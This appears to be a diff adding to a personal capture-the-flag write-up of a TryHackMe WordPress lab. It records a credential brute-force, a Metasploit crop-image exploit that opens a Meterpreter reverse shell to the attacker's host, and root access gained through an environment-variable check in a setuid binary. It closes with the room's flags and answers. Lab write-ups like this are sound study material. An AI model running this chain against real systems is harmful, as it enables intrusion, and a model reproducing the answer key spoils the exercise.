@@ -343,3 +343,348 @@ _______________________________________________________________
                          Version 3.8.22
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://blog.thm/ [10.10.142.247]
+[+] Started: Mon Oct  3 22:55:15 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://blog.thm/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://blog.thm/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
+ |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://blog.thm/wp-content/themes/twentytwenty/
+ | Last Updated: 2022-05-24T00:00:00.000Z
+ | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 2.0
+ | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+after a long time
+[SUCCESS] - kwheel / cutiepie1  
+
+[!] Valid Combinations Found:
+ | Username: kwheel, Password: cutiepie1
+```
+```text
+┌──(kali㉿kali)-[~/blog_wp]
+└─$ searchsploit wordpress 5.0.0
+------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                |  Path
+------------------------------------------------------------------------------ ---------------------------------
+WordPress 5.0.0 - Image Remote Code Execution                                 | php/webapps/49512.py
+WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                   | php/remote/46662.rb
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts       | multiple/webapps/47690.md
+WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                       | php/dos/47800.py
+WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)   | php/remote/47187.rb
+WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities           | php/webapps/39553.txt
+WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                     | php/webapps/44943.txt
+WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                   | php/webapps/48918.sh
+------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+I will use WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)  because can be use in metasploit if not then the other
+using msfconsole
+```
+```text
+┌──(kali㉿kali)-[~/blog_wp]
+└─$ msfconsole -q
+```
+```text
+msf6 > search wordpress 5.0.0
+
+Matching Modules
+================
+```
+```text
+#  Name                            Disclosure Date  Rank       Check  Description
+   -  ----                            ---------------  ----       -----  -----------
+   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce
+```
+```text
+msf6 > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > show options
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framewor
+                                         k/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME                    yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.253.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > set rhost blog.thm
+rhost => blog.thm
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > set username kwheel
+username => kwheel
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > set password cutiepie1
+password => cutiepie1
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > set lhost 10.11.81.220
+lhost => 10.11.81.220
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(multi/http/wp_crop_rce) > exploit
+
+[*] Started reverse TCP handler on 10.11.81.220:4444 
+[*] Authenticating with WordPress using kwheel:cutiepie1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload
+[+] Image uploaded
+[*] Including into theme
+[*] Sending stage (39927 bytes) to 10.10.142.247
+[*] Attempting to clean up files...
+[*] Meterpreter session 1 opened (10.11.81.220:4444 -> 10.10.142.247:55222) at 2022-10-03 23:31:36 -0400
+```
+```text
+meterpreter > 
+
+We can get a shell from our meterpreter session by running:
+```
+
+## Privilege Escalation
+```text
+meterpreter > shell
+Process 1647 created.
+Channel 1 created.
+SHELL=/bin/bash script -q /dev/null
+www-data@blog:/var/www/wordpress$ 
+
+Checking what file is owned by root and has the setuid bit set reveals the presence of an unknown executable (/usr/sbin/checker): 
+
+www-data@blog:/var/www/wordpress$ find / -type f -user root -perm -u=s 2>/dev/null
+<s$ find / -type f -user root -perm -u=s 2>/dev/null
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/sbin/checker
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/mount
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+
+Running it outputs that we are “Not an admin”: 
+
+www-data@blog:/var/www/wordpress$ /usr/sbin/checker
+/usr/sbin/checker
+Not an Admin
+
+www-data@blog:/var/www/wordpress$ file /usr/sbin/checker
+file /usr/sbin/checker
+/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
+
+The executable is a 64bit ELF
+
+www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
+ltrace /usr/sbin/checker
+getenv("admin")                                  = nil
+puts("Not an Admin"Not an Admin
+)                             = 13
++++ exited (status 0) +++
+
+Running it with ltrace reveals that the executable is checking an environment variable (admin) to determine if we are an admin: 
+
+Let’s create an admin environment variable and set it at 1: 
+
+www-data@blog:/var/www/wordpress$ cd /
+cd /
+www-data@blog:/$ export admin=1
+export admin=1
+www-data@blog:/$ /usr/sbin/checker
+/usr/sbin/checker
+root@blog:/# cd /root
+cd /root
+root@blog:/root# ll
+ll
+total 60
+drwx------  6 root root  4096 May 28  2020 ./
+drwxr-xr-x 24 root root  4096 May 25  2020 ../
+lrwxrwxrwx  1 root root     9 May 26  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
+drwx------  2 root root  4096 May 26  2020 .cache/
+drwx------  3 root root  4096 May 26  2020 .gnupg/
+drwxr-xr-x  3 root root  4096 May 26  2020 .local/
+-rw-------  1 root root   272 May 28  2020 .mysql_history
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+drwx------  2 root root  4096 May 25  2020 .ssh/
+-rw-------  1 root root 13291 May 28  2020 .viminfo
+-rw-r--r--  1 root root   215 May 27  2020 .wget-hsts
+-rw-r--r--  1 root root    33 May 26  2020 root.txt
+root@blog:/root# cat root.txt
+cat root.txt
+9a0b2b618bef9bfa7ac28c1353d9f318
+
+user.txt
+
+root@blog:/root# find / -type f -name user.txt 2>/dev/null
+find / -type f -name user.txt 2>/dev/null
+/home/bjoel/user.txt
+/media/usb/user.txt
+root@blog:/root# cat /home/bjoel/user.txt
+cat /home/bjoel/user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+root@blog:/root# cat /media/usb/user.txt
+cat /media/usb/user.txt
+c8421899aae571f7af486492b71a8ab7
+```
+![[Pasted image 20221003214536.png]]
+root.txt
+*9a0b2b618bef9bfa7ac28c1353d9f318*
+user.txt
+*c8421899aae571f7af486492b71a8ab7*
+Where was user.txt found?
+Not where you think!
+*/media/usb*
+```text
+view-source:http://blog.thm/
+
+powered-by-wordpress
+
+content="WordPress 5.0"
+```
+What CMS was Billy using?
+*wordpress*
+What version of the above CMS was being used?
+*5.0*
+### Credits
+The images used in this room have been used with the author's permission or in accordance with Section 107 of the U.S. Copyright Act.
+https://www.copyright.gov/title17/92chap1.html#107
+Congratulations!
+
+## Notes / Lessons Learned
+[[Web Enumeration]]
+
